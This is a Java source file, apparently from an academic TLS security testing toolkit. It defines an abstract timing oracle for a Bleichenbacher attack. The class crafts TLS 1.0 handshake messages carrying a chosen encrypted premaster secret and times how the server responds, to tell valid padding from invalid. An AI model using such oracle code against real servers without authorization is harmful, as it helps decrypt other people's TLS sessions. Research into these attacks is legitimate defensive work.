package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.stack.protocols.commons.ECipherSuite;
import de.rub.nds.ssl.stack.protocols.commons.EProtocolVersion;
import de.rub.nds.ssl.stack.protocols.commons.KeyExchangeParams;
import de.rub.nds.ssl.stack.protocols.handshake.ClientHello;
import de.rub.nds.ssl.stack.protocols.handshake.ClientKeyExchange;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.CipherSuites;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.EncPreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.RandomValue;
import de.rub.nds.ssl.stack.trace.MessageContainer;
import de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow;
import de.rub.nds.ssl.stack.workflows.commons.MessageBuilder;
import de.rub.nds.ssl.stack.workflows.commons.ObservableBridge;
import java.net.SocketException;
import java.util.List;
import java.util.Observable;

/**
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 *
 * September 14, 2012
 */
public abstract class ATimingOracle extends ASSLServerOracle {

    /**
     * Encrypted PKCS structure for CKE message.
     */
    protected byte[] encPKCSStructure;
    /**
     * Plain PMS (without PKCS).
     */
    protected byte[] plainPMS;

    /**
     * Constructor
     *
     * @param serverAddress
     * @param serverPort
     * @throws SocketException
     */
    public ATimingOracle(final String serverAddress, final int serverPort)
            throws SocketException {
        super(serverAddress, serverPort);
    }

    /**
     * Tries to train an Oracle with two different requests (e.g. valid and
     * invalid PKCS1 ciphertext) and their response times
     *
     * @param validCiphertext
     * @param invalidCiphertext
     * @throws OracleException if training gets impossible
     */
    public abstract void trainOracle(final byte[] validCiphertext,
            final byte[] invalidCiphertext) throws OracleException;

    /**
     * Update observed object.
     *
     * @param o Observed object
     * @param arg Arguments
     */
    @Override
    public final void update(final Observable o, final Object arg) {
        TLS10HandshakeWorkflow.EStates states = null;
        MessageContainer trace = null;
        ObservableBridge obs;
        if (o instanceof ObservableBridge) {
            obs = (ObservableBridge) o;
            states = (TLS10HandshakeWorkflow.EStates) obs.getState();
            trace = (MessageContainer) arg;
        }
        if (states != null) {
            switch (states) {
                case CLIENT_HELLO:
                    MessageBuilder builder = new MessageBuilder();
                    CipherSuites suites = new CipherSuites();
                    RandomValue random = new RandomValue();
                    suites.setSuites(new ECipherSuite[]{
                                ECipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA});
                    ClientHello clientHello = builder.createClientHello(
                            EProtocolVersion.TLS_1_0.getId(), random.encode(
                            false),
                            suites.encode(false), new byte[]{0x00});

                    trace.setCurrentRecord(clientHello);
                    break;
                case CLIENT_KEY_EXCHANGE:
                    KeyExchangeParams keyParams =
                            KeyExchangeParams.getInstance();
                    ClientKeyExchange cke = new ClientKeyExchange(
                            PROTOCOL_VERSION,
                            keyParams.getKeyExchangeAlgorithm());
                    // only if a valid PMS is set reset the Workflow PMS!
                    if(plainPMS != null) {
                        getWorkflow().setPreMasterSecret(new PreMasterSecret(
                                plainPMS));
                    }
                    EncPreMasterSecret encPMS = new EncPreMasterSecret(publicKey);
                    encPMS.setEncryptedPreMasterSecret(getEncPKCSStructure());
                    cke.setExchangeKeys(encPMS);
                    trace.setOldRecord(trace.getCurrentRecord());
                    trace.setCurrentRecord(cke);
                    break;
                default:
                    break;
            }
        }
    }

    /**
     * Analyzes a given MessageContainer list and computes timing delay between
     * Client key exchange and server change cipher spec or Client key exchange
     * and alert
     *
     * @param traces MessageContainer list
     * @return Timing delay.
     */
    long getTimeDelay(final List<MessageContainer> traces) {
        Long delay = 0L;
        Long timestamp = 0L;
        Long overall = -1L;

        for (MessageContainer trace : traces) {
            if (trace.getState() != null) {
                timestamp = trace.getTimestamp();

                switch (trace.getState()) {
                    case CLIENT_KEY_EXCHANGE:
                        delay = timestamp;
                        break;
                    case SERVER_CHANGE_CIPHER_SPEC:
                        overall = timestamp - delay;
                        break;
                    case ALERT:
                        overall = timestamp - delay;
                        break;
                    default:
                        break;
                }
            }
        }
        return overall;
    }

    /**
     * Get the already encrypted PKCS structure for CKE.
     *
     * @return Encrypted PKCS Structure
     */
    public byte[] getEncPKCSStructure() {
        byte[] tempCopy = new byte[this.encPKCSStructure.length];
        System.arraycopy(this.encPKCSStructure, 0, tempCopy, 0, tempCopy.length);
        return tempCopy;
    }

    /**
     * Set the already encrypted PKCS structure for CKE.
     *
     * @return Encrypted PKCS Structure
     */
    public void setEncPKCSStructure(final byte[] ckePKCSStructure) {
        this.encPKCSStructure = new byte[ckePKCSStructure.length];
        System.arraycopy(ckePKCSStructure, 0, this.encPKCSStructure, 0,
                this.encPKCSStructure.length);
    }

    /**
     * Get the plain PMS (without PKCS)
     *
     * @return Plain PMS
     */
    public byte[] getPlainPMS() {
        byte[] tempCopy = new byte[this.plainPMS.length];
        System.arraycopy(this.plainPMS, 0, tempCopy, 0, tempCopy.length);
        return tempCopy;
    }

    /**
     * Set the plain PMS (without PKCS)
     *
     * @param pms Plain PMS Structure
     */
    public void setPlainPMS(final byte[] pms) {
        this.plainPMS = new byte[pms.length];
        System.arraycopy(pms, 0, this.plainPMS, 0,
                this.plainPMS.length);
    }
}
